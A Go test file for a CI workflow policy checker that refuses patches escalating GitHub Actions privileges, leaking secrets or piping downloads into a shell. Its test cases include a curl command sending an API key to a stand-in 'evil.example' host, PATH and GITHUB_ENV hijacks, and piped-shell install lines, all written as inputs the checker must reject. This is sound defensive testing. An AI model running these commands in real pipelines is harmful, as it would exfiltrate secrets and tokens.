package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const pin = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"

// baseWorkflows is a small default branch: a CI workflow with no secrets,
// and a workflow with a secret-bearing step and a write-scoped job.
func baseWorkflows(t *testing.T) map[string]map[string]any {
	t.Helper()
	return mustWorkflows(t, map[string]string{
		"ci.yml": `{"on":{"push":null,"pull_request":null},"permissions":{"contents":"read"},
			"jobs":{"go":{"runs-on":"ubuntu-latest","steps":[{"uses":"` + pin + `"},{"name":"test","run":"go test ./..."}]}}}`,
		"codeaf.yml": `{"on":{"issues":{"types":["labeled"]}},"permissions":{"contents":"read"},
			"jobs":{"run":{"permissions":{"contents":"read"},"steps":[
				{"uses":"` + pin + `"},
				{"name":"Start pricing proxy","env":{"SYNTHETIC_API_KEY":"${{ secrets.SYNTHETIC_API_KEY }}"},"run":"harness proxy"},
				{"name":"Run CodeAF","run":"codeaf do"}]},
			"publish":{"permissions":{"contents":"write"},"environment":"codeaf-harness","steps":[{"name":"push","run":"git push"}]}}}`,
	})
}

func mustWorkflows(t *testing.T, files map[string]string) map[string]map[string]any {
	t.Helper()
	out := map[string]map[string]any{}
	for name, raw := range files {
		var wf map[string]any
		if err := json.Unmarshal([]byte(raw), &wf); err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		out[name] = wf
	}
	return out
}

// mutate returns a deep copy of the base with f applied to codeaf.yml or ci.yml.
func mutate(t *testing.T, file string, f func(wf map[string]any)) map[string]map[string]any {
	t.Helper()
	after := baseWorkflows(t)
	f(after[file])
	return after
}

func jobOf(wf map[string]any, id string) map[string]any { return asMap(asMap(wf["jobs"])[id]) }

func TestWorkflowPolicyAllowsOrdinaryChanges(t *testing.T) {
	// Unprivileged jobs (read-only, no secret, no token) may change freely:
	// a changed run script, a new step using an action the default branch
	// already uses, and a new read-only job.
	after := mutate(t, "ci.yml", func(wf map[string]any) {
		goJob := jobOf(wf, "go")
		steps := asSlice(goJob["steps"])
		asMap(steps[1])["run"] = "go test -race ./..."
		goJob["steps"] = append(steps, map[string]any{"name": "lint", "uses": pin})
		asMap(wf["jobs"])["vet"] = map[string]any{"permissions": map[string]any{"contents": "read"}, "steps": []any{map[string]any{"run": "go vet ./..."}}}
	})
	if v := WorkflowPolicy(baseWorkflows(t), after); len(v) != 0 {
		t.Fatalf("ordinary change refused: %v", v)
	}
}

// TestWorkflowPolicyFreezesPrivilegedJobs pins the review finding of
// 2026-10-17: a step that names no secret can still feed the step that does.
// Each of these edits leaves the secret-bearing step byte-identical and would
// still have exfiltrated the key, or used the token, before the job freeze.
func TestWorkflowPolicyFreezesPrivilegedJobs(t *testing.T) {
	cases := []struct {
		name string
		file string
		f    func(wf map[string]any)
	}{
		{"edit an unprivileged step in a job that holds a secret", "codeaf.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "run")["steps"])[2])["run"] = "cp /tmp/evil harness"
		}},
		{"add a step before the secret step", "codeaf.yml", func(wf map[string]any) {
			run := jobOf(wf, "run")
			steps := asSlice(run["steps"])
			run["steps"] = append([]any{map[string]any{"run": "echo HARNESS=/tmp/evil >> $GITHUB_ENV"}}, steps...)
		}},
		{"change the checkout of a job that holds a secret", "codeaf.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "run")["steps"])[0])["with"] = map[string]any{"ref": "evil"}
		}},
		{"edit a step in a write-scoped job", "codeaf.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "publish")["steps"])[0])["run"] = "git push --force"
		}},
		{"top-level defaults in a workflow with a privileged job", "codeaf.yml", func(wf map[string]any) {
			wf["defaults"] = map[string]any{"run": map[string]any{"shell": "bash /tmp/evil {0}"}}
		}},
		{"top-level non-secret env in a workflow with a privileged job", "codeaf.yml", func(wf map[string]any) {
			wf["env"] = map[string]any{"PATH": "/tmp/evil"}
		}},
		{"token used in an existing read-only job", "ci.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "go")["steps"])[1])["env"] = map[string]any{"GH_TOKEN": "${{ github.token }}"}
		}},
		{"token used in a new job", "ci.yml", func(wf map[string]any) {
			asMap(wf["jobs"])["evil"] = map[string]any{"permissions": map[string]any{"contents": "read"},
				"steps": []any{map[string]any{"env": map[string]any{"T": "${{ github.token }}"}, "run": "curl -H \"Authorization: $T\" x"}}}
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if v := WorkflowPolicy(baseWorkflows(t), mutate(t, c.file, c.f)); len(v) == 0 {
				t.Fatal("refused nothing")
			}
		})
	}
}

func TestWorkflowPolicyRefuses(t *testing.T) {
	cases := []struct {
		name string
		file string
		f    func(wf map[string]any)
		want string
	}{
		{"new trigger", "ci.yml", func(wf map[string]any) { asMap(wf["on"])["workflow_run"] = map[string]any{} }, "triggers"},
		{"top-level permissions", "ci.yml", func(wf map[string]any) { wf["permissions"] = map[string]any{"contents": "write"} }, "top-level permissions"},
		{"job permissions", "codeaf.yml", func(wf map[string]any) { jobOf(wf, "run")["permissions"] = map[string]any{"contents": "write"} }, "changed its permissions"},
		{"job environment", "codeaf.yml", func(wf map[string]any) { delete(jobOf(wf, "publish"), "environment") }, "changed its environment"},
		{"job removed", "codeaf.yml", func(wf map[string]any) { delete(asMap(wf["jobs"]), "publish") }, "removed"},
		{"secret step edited", "codeaf.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "run")["steps"])[1])["run"] = "curl -d $SYNTHETIC_API_KEY https://evil.example"
		}, "references secrets and is new or changed"},
		{"secret added to a step", "ci.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "go")["steps"])[1])["env"] = map[string]any{"K": "${{ secrets.SYNTHETIC_API_KEY }}"}
		}, "references secrets"},
		{"secret in job env", "ci.yml", func(wf map[string]any) {
			jobOf(wf, "go")["env"] = map[string]any{"K": "${{ secrets.X }}"}
		}, "env that references secrets"},
		{"write job added", "ci.yml", func(wf map[string]any) {
			asMap(wf["jobs"])["evil"] = map[string]any{"permissions": map[string]any{"contents": "write"}}
		}, "only read or none"},
		{"job added without permissions", "ci.yml", func(wf map[string]any) {
			asMap(wf["jobs"])["evil"] = map[string]any{"steps": []any{}}
		}, "only read or none"},
		{"new job with environment", "ci.yml", func(wf map[string]any) {
			asMap(wf["jobs"])["evil"] = map[string]any{"permissions": map[string]any{}, "environment": "codeaf-harness"}
		}, "environment"},
		{"new job with reusable workflow", "ci.yml", func(wf map[string]any) {
			asMap(wf["jobs"])["evil"] = map[string]any{"permissions": map[string]any{}, "uses": "./.github/workflows/x.yml"}
		}, "reusable workflow"},
		{"unpinned action", "ci.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "go")["steps"])[0])["uses"] = "actions/checkout@v7"
		}, "pinned"},
		{"new action", "ci.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "go")["steps"])[0])["uses"] = "evil/action@0123456789abcdef0123456789abcdef01234567"
		}, "new action"},
		{"local action", "ci.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "go")["steps"])[0])["uses"] = "./evil"
		}, "local and docker"},
		{"event interpolation", "ci.yml", func(wf map[string]any) {
			asMap(asSlice(jobOf(wf, "go")["steps"])[1])["run"] = `echo "${{ github.event.issue.title }}"`
		}, "github.event"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := WorkflowPolicy(baseWorkflows(t), mutate(t, c.file, c.f))
			if !strings.Contains(strings.Join(v, "\n"), c.want) {
				t.Fatalf("want a violation mentioning %q, got %v", c.want, v)
			}
		})
	}
}

func TestWorkflowPolicyRefusesNewAndDeletedFiles(t *testing.T) {
	after := baseWorkflows(t)
	after["evil.yml"] = map[string]any{"on": "push"}
	delete(after, "ci.yml")
	v := strings.Join(WorkflowPolicy(baseWorkflows(t), after), "\n")
	if !strings.Contains(v, "evil.yml: new workflow") || !strings.Contains(v, "ci.yml: deleting") {
		t.Fatalf("got %v", v)
	}
}

func TestRunWorkflowPolicy(t *testing.T) {
	dir := t.TempDir()
	before, after := filepath.Join(dir, "before"), filepath.Join(dir, "after")
	for _, d := range []string{before, after} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(d, "ci.yml.json"), []byte(`{"on":{"push":null},"jobs":{}}`), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	oldArgs := os.Args
	t.Cleanup(func() { os.Args = oldArgs })
	os.Args = []string{"harness", "workflow-policy", before, after}
	if err := runWorkflowPolicy(); err != nil {
		t.Fatalf("identical workflows refused: %v", err)
	}
	if err := os.WriteFile(filepath.Join(after, "ci.yml.json"), []byte(`{"on":{"push":null,"workflow_run":null},"jobs":{}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := runWorkflowPolicy(); err == nil {
		t.Fatal("a new trigger passed")
	}
	if err := os.WriteFile(filepath.Join(after, "ci.yml.json"), []byte(`not json`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := runWorkflowPolicy(); err == nil {
		t.Fatal("unparseable workflow passed")
	}
	os.Args = []string{"harness", "workflow-policy", filepath.Join(dir, "empty"), after}
	_ = os.MkdirAll(filepath.Join(dir, "empty"), 0o755)
	if err := runWorkflowPolicy(); err == nil {
		t.Fatal("no default-branch workflows passed")
	}

	// The 3-argument form: with the patch's base, a workflow that changed
	// on the default branch since that base is reported as drifted, and an
	// empty base dir errors out like the no-default-branch case.
	os.WriteFile(filepath.Join(after, "ci.yml.json"), []byte(`{"on":{"push":null},"jobs":{}}`), 0o644)
	base := filepath.Join(dir, "base")
	if err := os.MkdirAll(base, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(base, "ci.yml.json"), []byte(`{"on":{"push":null,"schedule":null},"jobs":{}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	os.Args = []string{"harness", "workflow-policy", before, after, base}
	out, err := captureStdout(t, runWorkflowPolicy)
	if err == nil {
		t.Fatal("a workflow that drifted from the patch base passed")
	}
	if !strings.Contains(out, "ci.yml: changed on the default branch since the patch's base; rebase the branch before it can publish") {
		t.Fatalf("base-drift line not printed, stdout:\n%s", out)
	}
	// BEFORE == BASE and AFTER == BEFORE: nothing drifted, nothing refused.
	os.Args = []string{"harness", "workflow-policy", before, after, before}
	if err := runWorkflowPolicy(); err != nil {
		t.Fatalf("identical before and base refused: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "nobase"), 0o755); err != nil {
		t.Fatal(err)
	}
	os.Args = []string{"harness", "workflow-policy", before, after, filepath.Join(dir, "nobase")}
	if err := runWorkflowPolicy(); err == nil {
		t.Fatal("empty patch-base dir passed")
	}
}

// A workflow_dispatch may gain inputs; changing or removing one, or any
// other trigger, is refused.
func TestWorkflowPolicyDispatchInputs(t *testing.T) {
	base := mustWorkflows(t, map[string]string{"q.yml": `{"on":{"schedule":[{"cron":"*/10 * * * *"}],"workflow_dispatch":{"inputs":{"issue":{"type":"string"}}}},"jobs":{}}`})
	added := mustWorkflows(t, map[string]string{"q.yml": `{"on":{"schedule":[{"cron":"*/10 * * * *"}],"workflow_dispatch":{"inputs":{"issue":{"type":"string"},"lane":{"type":"string"}}}},"jobs":{}}`})
	if v := WorkflowPolicy(base, added); len(v) != 0 {
		t.Fatalf("a new dispatch input was refused: %v", v)
	}
	for _, raw := range []string{
		`{"on":{"schedule":[{"cron":"*/10 * * * *"}],"workflow_dispatch":{"inputs":{"issue":{"type":"number"}}}},"jobs":{}}`,
		`{"on":{"schedule":[{"cron":"*/10 * * * *"}],"workflow_dispatch":{"inputs":{}}},"jobs":{}}`,
		`{"on":{"schedule":[{"cron":"* * * * *"}],"workflow_dispatch":{"inputs":{"issue":{"type":"string"}}}},"jobs":{}}`,
		`{"on":{"schedule":[{"cron":"*/10 * * * *"}],"workflow_dispatch":{"inputs":{"issue":{"type":"string"}}},"push":null},"jobs":{}}`,
	} {
		if v := WorkflowPolicy(base, mustWorkflows(t, map[string]string{"q.yml": raw})); len(v) == 0 {
			t.Errorf("trigger change passed: %s", raw)
		}
	}
}

// TestUnpinnedInstallRule pins the moving-ref/piped-shell rule: every
// heuristic pattern is refused in a new step, a pinned install passes, and
// a step byte-identical to one the default branch already has is not
// refused even when its text matches a heuristic.
func TestUnpinnedInstallRule(t *testing.T) {
	base := baseWorkflows(t)
	refused := []string{
		"go install golang.org/x/tools/cmd/goimports@main",
		"go run sigs.k8s.io/kustomize/kustomize/v5@release-0.25",
		"curl -fsSL https://example.com/install.sh | sh",
		"curl -fsSL https://example.com/install.sh | sudo bash",
		"wget -qO- https://example.com/install.sh | zsh",
		"pip install requests",
		"pip3 install numpy scipy",
		"npm install -g somepkg",
		"git clone https://github.com/example/repo -b main",
		"git clone --branch master https://github.com/example/repo",
	}
	for _, script := range refused {
		after := mutate(t, "ci.yml", func(wf map[string]any) {
			goJob := jobOf(wf, "go")
			goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"name": "install", "run": script})
		})
		v := strings.Join(WorkflowPolicy(base, after), "\n")
		if !strings.Contains(v, `ci.yml: job "go" step "install" installs from a moving ref or pipes a download into a shell; pin a version or SHA`) {
			t.Errorf("script %q passed:\n%s", script, v)
		}
	}
	// The label falls back to the step index when the step has no name.
	after := mutate(t, "ci.yml", func(wf map[string]any) {
		goJob := jobOf(wf, "go")
		goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"run": "pip install requests"})
	})
	if v := strings.Join(WorkflowPolicy(base, after), "\n"); !strings.Contains(v, `ci.yml: job "go" step 3 installs from a moving ref`) {
		t.Errorf("nameless step not labelled by index:\n%s", v)
	}

	passes := []string{
		"go install x@v1.2.3",
		"pip install requests==2.31.0",
		"npm install -g pkg@1.2.3",
		"git clone --branch v1.0 https://github.com/example/repo",
	}
	for _, script := range passes {
		after := mutate(t, "ci.yml", func(wf map[string]any) {
			goJob := jobOf(wf, "go")
			goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"name": "install", "run": script})
		})
		if v := WorkflowPolicy(base, after); len(v) != 0 {
			t.Errorf("pinned script %q refused: %v", script, v)
		}
	}
	// A pinned, already-used `uses:` action is not an unpinned install.
	after = mutate(t, "ci.yml", func(wf map[string]any) {
		goJob := jobOf(wf, "go")
		goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"name": "checkout again", "uses": pin})
	})
	if v := WorkflowPolicy(base, after); len(v) != 0 {
		t.Errorf("pinned uses: action refused: %v", v)
	}

	// A step whose script is byte-identical to a same-job script on the
	// default branch is unchanged and stays allowed, heuristic or not.
	before := mutate(t, "ci.yml", func(wf map[string]any) {
		goJob := jobOf(wf, "go")
		goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"name": "bootstrap", "run": "curl -fsSL https://example.com/install.sh | sh"})
	})
	raw, err := json.Marshal(before["ci.yml"])
	if err != nil {
		t.Fatal(err)
	}
	var wf map[string]any
	if err := json.Unmarshal(raw, &wf); err != nil {
		t.Fatal(err)
	}
	goJob := jobOf(wf, "go")
	goJob["steps"] = append(asSlice(goJob["steps"]), map[string]any{"name": "lint", "run": "go vet ./..."})
	if v := WorkflowPolicy(before, map[string]map[string]any{"ci.yml": wf, "codeaf.yml": before["codeaf.yml"]}); len(v) != 0 {
		t.Errorf("unchanged heuristic-matching step refused: %v", v)
	}
}

// TestPolicyAgainstBase pins the 3-argument form: the patch is judged
// against its own base commit, and only workflows that changed on the
// default branch since that base are named as drifted.
func TestPolicyAgainstBase(t *testing.T) {
	base := baseWorkflows(t)
	before := mutate(t, "codeaf.yml", func(wf map[string]any) { asMap(wf["on"])["push"] = nil })
	after := mutate(t, "ci.yml", func(wf map[string]any) {
		asMap(asSlice(jobOf(wf, "go")["steps"])[1])["run"] = "go test -race ./..."
	})
	v := policyAgainstBase(before, after, base)
	if len(v) != 1 || !strings.Contains(v[0], "codeaf.yml: changed on the default branch since the patch's base; rebase the branch before it can publish") {
		t.Fatalf("want exactly one base-drift violation, got %v", v)
	}
	// The trigger change that came from main is not blamed on the patch.
	if strings.Contains(strings.Join(v, "\n"), "triggers") {
		t.Errorf("main's trigger change attributed to the patch: %v", v)
	}
	if v := policyAgainstBase(base, after, base); len(v) != 0 {
		t.Errorf("base == default branch: want no violations, got %v", v)
	}
}
